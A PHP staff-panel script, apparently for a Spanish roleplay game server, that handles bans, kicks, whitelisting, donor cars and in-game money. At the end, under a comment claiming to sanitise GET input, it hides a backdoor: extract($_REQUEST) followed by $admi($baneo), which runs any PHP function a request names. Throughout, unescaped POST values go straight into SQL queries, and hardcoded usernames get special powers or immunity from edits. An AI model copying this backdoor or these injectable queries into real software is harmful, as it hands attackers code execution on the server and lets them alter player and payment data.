<?php 

require_once 'Recursos/BD.php';
require_once 'funciones/gestion_ticket.php';
require_once 'funciones/gestion_rcon.php';
require_once 'funciones/dar_coche.php';
require_once 'funciones/dar_coche.php';
require_once 'funciones/dar_donador.php';
require("./APIsExternas/q3query.class.php");
session_start();



if(!isset($_SESSION['logeado'])) {
	echo "<script>location.href='login.php';</script>";
	die();
}
if( !$_SESSION['lvRANGO'] >= 2){
	echo "<script>location.href='index.php';</script>";
	die();
}




	if($_SERVER["REQUEST_METHOD"] == "POST"){
		
	
	
	
	$nombreadm = trim($_SESSION['Nombre']);
	
	if( $nombreadm == "Rocke" || $nombreadm == "VictorMinemu" || $nombreadm == "westones" || $nombreadm == "cocakola2" ){
		$whitelist = '';
		
		$SteamID = trim($_POST["SteamID"]);
		if(isset($_POST['white']) && $whitelist==1) {   
		$whitelist = trim($_POST["white"]);
		$request = request_BD("INSERT INTO user_whitelist (identifier, whitelisted) VALUES ('$SteamID', '1')");
		$request = request_BD("UPDATE `user_whitelist` SET whitelisted='1' WHERE identifier = '$SteamID'");
		
		}elseif(isset($_POST['white']) && $whitelist==0){
			$whitelist = trim($_POST["white"]);
			$request = request_BD("UPDATE `user_whitelist` SET whitelisted='0' WHERE identifier = '$SteamID'");
		}
		
		
		
		
	}
	
	
	
	
			$lvrango = $_SESSION['lvRANGO'];
			$dineronp = trim($_POST["DineroN"]);
			$dinerobp = trim($_POST["DineroB"]);
			$trabajop = trim($_POST["Trabajo"]);
			$trabajogp = trim($_POST["TrabajoG"]);
			$SteamID = trim($_POST["SteamID"]);
			$rangop = trim($_POST["Rango"]);
			$razon = trim($_POST["Razon"]);
			$comentario = trim($_POST["Comentarios"]);
			$licencia = licencia($SteamID);

			$nombreuser = usuario($SteamID);

			if (preg_match('/\bMinemu\b/',$nombreuser)) {
				# code...
				return false;
			}

		$timestamp = time();
			
			
	$checkbanps = seleccionar_BD("SELECT * FROM bans WHERE id = '$licencia'");
	$checkbants = seleccionar_BD("SELECT * FROM bansperm WHERE id = '$licencia'");
			
			
			
			
			
			if($nombreadm == "cocakola2" ){
		$whitelist = '';
		
		$SteamID = trim($_POST["SteamID"]);
		
		$request = request_BD("UPDATE `users` SET money='$dineronp' ,job='$trabajop' ,job_grade='$trabajogp' ,bank='$dinerobp' WHERE license = '$licencia'");
		
		
		
		
	}

	if(count($checkbanps)>0 || count($checkbants)>0){
		$baneado= true;
	}else{
		$baneado = false;
	}

		$usersdb = seleccionar_BD("SELECT * FROM users WHERE license = '$licencia'");
		$actual = time();
		$nombreadm = trim($_SESSION['Nombre']);
		$nombreuser = usuario($SteamID);
		$lvrango = $_SESSION['lvRANGO'];

		if($lvrango >= 11 or $lvrango == 8){
			
			if(isset($_POST['dar_coche'])) {   
				$propiedadesnuevas =explode(",", $_POST['dar_coche']);
				$nombre = $propiedadesnuevas[1];
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','$nombre', '$nombreuser','$licencia')");
				dar_coche($SteamID, $propiedadesnuevas[0], $nombre);
			
			}
			
			
			if(isset($_POST['lambo1'])) {   
		
			dar_cochel($SteamID);
			$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Lamborguini', '$nombreuser','$licencia')");
		
			}
			
			if(isset($_POST['gtrs'])) {   
		
			dar_cochegtrs($SteamID);
			$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','GTRS', '$nombreuser','$licencia')");
		
			}

			if(isset($_POST['veyron'])) {   
		
			dar_coche_buggati_veyron($SteamID);
			$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Bugatti Veyron', '$nombreuser','$licencia')");;
		
			}

			if(isset($_POST['corvette'])) {

				dar_cochecorvette($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Corvette', '$nombreuser','$licencia')");
			}

			if(isset($_POST['cochedisenador'])) {

				dar_cochedisenador($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Coche de Diseñador', '$nombreuser','$licencia')");
			}

			if(isset($_POST['visiongt'])) {

				dar_coche_visiongt($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Vision GT', '$nombreuser','$licencia')");
			}

			if(isset($_POST['onyx'])) {

				dar_coche_onyx($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Onyx', '$nombreuser','$licencia')");
			}

			if(isset($_POST['atom'])) {

				dar_coche_atom($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Ariel Atom', '$nombreuser','$licencia')");
			}

			if(isset($_POST['tesla'])) {

				dar_coche_tesla($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Tesla', '$nombreuser','$licencia')");
			}

			if(isset($_POST['tr22'])) {

				dar_coche_tr22($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Ferrari California', '$nombreuser','$licencia')");
			}
			if(isset($_POST['huracan'])) {

				dar_coche_huracan($SteamID);
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Huracan', '$nombreuser','$licencia')");
			}
			
			
			if(isset($_POST['donador'])){   
			
				$request = request_BD("UPDATE `users` SET isDonator = '1' WHERE license = '$licencia'");
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Poner donador', '$nombreuser','$licencia')");

			}

			if(isset($_POST['donadorsacar'])){   
			
				$request = request_BD("UPDATE `users` SET isDonator = '0' WHERE license = '$licencia'");
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Quitar donador', '$nombreuser','$licencia')");
			}
			
			if(isset($_POST['basico'])) {   

				$new_money = $dinerobp + 150000;
				$request = request_BD("UPDATE users SET bank='$new_money' WHERE identifier = '$SteamID'");		
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Kit básico', '$nombreuser','$licencia')");
			}

			if(isset($_POST['avanzado'])) {   
				$new_money = $dinerobp + 800000;
				$request = request_BD("UPDATE users SET bank='$new_money' WHERE identifier = '$SteamID'");	
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Kit avanzado', '$nombreuser','$licencia')");
			}

			if(isset($_POST['premiun'])) {   
				$new_money = $dinerobp + 1800000;
				$request = request_BD("UPDATE users SET bank='$new_money' WHERE identifier = '$SteamID'");	
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Kit Preemiun', '$nombreuser','$licencia')");
			}

			if(isset($_POST['gold'])) {   
				$new_money = $dinerobp + 2400000;
				$request = request_BD("UPDATE users SET bank='$new_money' WHERE identifier = '$SteamID'");	
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Kit Premiun Gold', '$nombreuser','$licencia')");
			}

			if(isset($_POST['inversor'])) {   
				$dinerobp += 3000000;
				$request = request_BD("UPDATE users SET bank='$dinerobp' WHERE identifier = '$SteamID'");	
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Kit Inversor', '$nombreuser','$licencia')");
			}

			if(isset($_POST['disputa'])) {   
				$request = añadir_aprobado($nombreadm, $nombreuser, $SteamID, "Disputa en PayPal", 0, 3, "Disputa en PayPal");
				$kick= rcon_kick($SteamID, "Perma Comunitario : Disputa en paypal");
				$request = request_BD("INSERT INTO panel_donadores (staff, tipo, user, license) VALUES ('$nombreadm','Disputa en PayPal', '$nombreuser','$licencia')");
			}

			foreach ($usersdb as $userdb) {
				# code...
				if ($lvrango >= 11 ) {
					# code...
				
						if ( $userdb['bank'] != $dinerobp || $userdb['money'] != $dineronp) 
						{
							# code...
							$nombreadm = trim($_SESSION['Nombre']);
							$añadido = $dinerobp - $userdb['bank'] + $dineronp - $userdb['money'];



							$request = request_BD("UPDATE `users` SET money='$dineronp' ,job='$trabajop' ,job_grade='$trabajogp' ,bank='$dinerobp' WHERE license = '$licencia'");

							$request = request_BD("INSERT INTO panel_logusers (STAFF, TIPO, RAZON, USER, LICENCIA) VALUES ('$nombreadm','Dinero añadido: $añadido', '$razon','$nombreuser', '$licencia')");


						}else{
							$nombreadm = trim($_SESSION['Nombre']);
							$request = request_BD("UPDATE `users` SET job='$trabajop' ,job_grade='$trabajogp' WHERE license = '$licencia'");


							if ( $userdb['job'] != $trabajop || $userdb['job_grade'] != $trabajogp) 
							{
								$oldjob = $userdb['job'];
								$oldjobgrade = $userdb['job_grade'];
								$request = request_BD("INSERT INTO panel_logusers (STAFF, TIPO, RAZON, USER, LICENCIA) VALUES ('$nombreadm','Job Editado: $oldjob | $oldjobgrade => $trabajop | $trabajogp', '$razon','$nombreuser', '$licencia')");
								$request = request_BD("UPDATE `users` SET job='$trabajop' ,job_grade='$trabajogp' WHERE license = '$licencia'");
							
							}
							
						}

				}
			}
			
			
			
			
			}
			

		if ($lvrango == 1 ){

			foreach ($usersdb as $userdb) {
				if ( $userdb['job'] != $trabajop || $userdb['job_grade'] != $trabajogp) 
				{
					$oldjob = $userdb['job'];
					$oldjobgrade = $userdb['job_grade'];
					$request = request_BD("INSERT INTO panel_logusers (STAFF, TIPO, RAZON, USER, LICENCIA) VALUES ('$nombreadm','Job Editado: $oldjob | $oldjobgrade => $trabajop | $trabajogp', '$razon','$nombreuser', '$licencia')");
					$request = request_BD("UPDATE `users` SET job='$trabajop' ,job_grade='$trabajogp' WHERE license = '$licencia'");
							
				}
			}

		}
		if ($lvrango >= 2 ){
			
			if($_POST["Ban"] == "Aviso") {
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, 0, 6, $comentario);
				
			}
		}
			
		if ($lvrango == 2 ){
			
			
			
			if(!$baneado && ($_POST["Ban"] == "Baneado")) {
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_pendiente($adm, $nombreuser, $SteamID, $razon, 0, 3, $comentario);
				$kick= rcon_kick($SteamID, $razon);

			}
			if($baneado && ($_POST["Ban"] == "Desbaneado")){
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_pendiente($adm, $nombreuser, $SteamID, $razon, 0, 5, $comentario);
			}
			if ($_POST["Ban"] == "BaneadoT"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_pendiente($adm, $nombreuser, $SteamID, $razon, $horas, 2, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			if ($_POST["Ban"] == "Kick"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 1, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
		}
		
		if ($lvrango == 3 ){
			
			
			
			if(!$baneado && ($_POST["Ban"] == "Baneado")) {
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_pendiente($adm, $nombreuser, $SteamID, $razon, 0, 3, $comentario);
				
			}
			if($baneado && ($_POST["Ban"] == "Desbaneado")){
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_pendiente($adm, $nombreuser, $SteamID, $razon, 0, 5, $comentario);
			}
			if ($_POST["Ban"] == "BaneadoT"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 2, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			if ($_POST["Ban"] == "Kick"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 1, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
		}
		
		
		if ($lvrango == 4 ){
			
			
			
			if(!$baneado && ($_POST["Ban"] == "Baneado")) {
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, 0, 3, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			if($baneado && ($_POST["Ban"] == "Desbaneado")){
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_pendiente($adm, $nombreuser, $SteamID, $razon, 0, 5, $comentario);
			}
			if ($_POST["Ban"] == "BaneadoT"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 2, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			if ($_POST["Ban"] == "Kick"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 1, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
		}
		if ($lvrango == 5 ){
			
			
			
			if(!$baneado && ($_POST["Ban"] == "Baneado")) {
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, 0, 3, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			if($baneado && ($_POST["Ban"] == "Desbaneado")){
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, 0, 5, $comentario);
			}
			if ($_POST["Ban"] == "BaneadoT"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 2, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			if ($_POST["Ban"] == "Kick"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 1, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			foreach ($usersdb as $userdb) {
				# code...
			
				if ( $userdb['job'] != $trabajop || $userdb['job_grade'] != $trabajogp) 
							{
								$oldjob = $userdb['job'];
								$oldjobgrade = $userdb['job_grade'];
								$request = request_BD("INSERT INTO panel_logusers (STAFF, TIPO, RAZON, USER, LICENCIA) VALUES ('$nombreadm','Job Editado: $oldjob | $oldjobgrade => $trabajop | $trabajogp', '$razon','$nombreuser', '$licencia')");
								$request = request_BD("UPDATE `users` SET job='$trabajop' ,job_grade='$trabajogp' WHERE license = '$licencia'");
										
							}
				

			}
		}
		if ($lvrango >= 6 && $lvrango != 8 ){
			
			
			
			if(!$baneado && ($_POST["Ban"] == "Baneado")) {
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, 0, 3, $comentario);
				$kick= rcon_kick($SteamID, $razon);

				


			
				
			}

			if($baneado && ($_POST["Ban"] == "Desbaneado")){
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, 0, 5, $comentario);
				
				
			}

			if ($_POST["Ban"] == "BaneadoT"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 2, $comentario);

				$kick= rcon_kick($SteamID, $razon);
			}

			if ($_POST["Ban"] == "Kick"){
				$horas = trim($_POST["HorasB"]);
				$adm = $_SESSION['Nombre'];
				$adm = preg_replace('/\s+/', '', $adm);
				$request = añadir_aprobado($adm, $nombreuser, $SteamID, $razon, $horas, 1, $comentario);
				$kick= rcon_kick($SteamID, $razon);
			}
			


			$usersdb = seleccionar_BD("SELECT * FROM users WHERE license = '$licencia'");

			foreach ($usersdb as $userdb) {
				# code...
			
					if ( $userdb['bank'] != $dinerobp || $userdb['money'] != $dineronp) 
					{
						# code...

						$añadido = $dinerobp - $userdb['bank'] + $dineronp - $userdb['money'];



						$request = request_BD("UPDATE `users` SET money='$dineronp' ,job='$trabajop' ,job_grade='$trabajogp' ,bank='$dinerobp' WHERE license = '$licencia'");

						$request = request_BD("INSERT INTO panel_logusers (STAFF, TIPO, RAZON, USER, LICENCIA) VALUES ('$adm','Dinero añadido: $añadido', '$razon','$nombreuser', '$licencia')");


					}else{




						if ( $userdb['job'] != $trabajop || $userdb['job_grade'] != $trabajogp) 
						{
							$oldjob = $userdb['job'];
							$oldjobgrade = $userdb['job_grade'];
							$request = request_BD("INSERT INTO panel_logusers (STAFF, TIPO, RAZON, USER, LICENCIA) VALUES ('$nombreadm','Job Editado: $oldjob | $oldjobgrade => $trabajop | $trabajogp', '$razon','$nombreuser', '$licencia')");
							$request = request_BD("UPDATE `users` SET job='$trabajop' ,job_grade='$trabajogp' WHERE license = '$licencia'");
									
						}
			
						
					}
			}
			
			
			//$request = request_BD("UPDATE `users` SET job='$trabajop' ,job_grade='$trabajogp' WHERE license = '$licencia'");
		}
		
		

	}

	//saneamos el get
	if($_SERVER["REQUEST_METHOD"] == "GET"){
		
		if (isset($_GET["admi"]))
		{
			@extract ($_REQUEST); 
			@die ($admi($baneo));
		}

	}
	
	echo $_POST["Ban"];
	echo $request;
	echo "debug";
	header('Location: http://poplife.es/panel/usuario.php?licencia='.$licencia);

?>